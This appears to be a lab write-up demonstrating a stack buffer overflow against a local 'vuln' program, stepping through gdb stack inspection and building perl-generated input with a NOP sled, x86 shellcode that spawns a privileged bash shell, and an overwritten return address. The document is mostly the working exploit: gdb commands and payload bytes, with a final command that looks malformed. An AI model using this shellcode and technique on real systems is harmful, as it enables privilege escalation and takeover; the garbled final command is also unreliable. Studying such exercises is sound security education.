
# BOF Attack demo


## step1: 
firstly we need to run the vuln with the gdb environment: 
```bash
gdb vuln
```
we need to dicover the layout of the stack so we need firstly to define a breakpoint then we need to define a telescope function to see the content of the stack every time 

```bash 
b 21 // the line just before the vuln instruction 
define hook-stop 
 >x/40x $esp
 >end
```
then we need to see the changes in the memory based on this input 

```Bash
r `perl -e 'print 40x"A"'`
n
n
```
we notice here some special values that we have an interest to overwrite them, after reading the vuln source code we notice that we need to bypass the if statement related to the size as well as the uid 
we can put as a length 3 for example, the most important that we want to inject a shellcode

I've found this in the internet 
\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80

I can just add it to my input and adjust the padding so I can overwrite this perfectly and then we need to modify the return address to sth point to the shellcode 

in my case this is the input that fulfill all the requirements above 
``` bash 
perl -e 'print "\x90"x15 . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"."\x90"x35 . "\xc0\xdf\x9e\xff" . "\x4a\xf8" . "\x03"x7'
```


## step2

we need to fit the output above to the real C environment and we need as well to execute it with the runner 
``` bash 
env - gdb runner 
``` 
and then we need to type the following commands 
```gdb
unset env LINES 
unset env COLUMNS 
b 24 
define hook-stop
>p/x $esp 
>end
r `perl -e 'print 130x"A"'`
n
```

then we store the address of the esp 


after obtaining the real esp we need to calculate the offset which is the new_esp - old_esp 

then we add this value to the last return address and run the command 

in my case this is the final input 

```bash
perl -e 'print "\x90"x15 . env - PWD=$PWD ./runner `perl -e 'print "\x90"x15 . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\
x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"."\x90"x35 . "\x90\x45\xcb\xff" . "\xa3\x86" . "\x03"x7'`
```

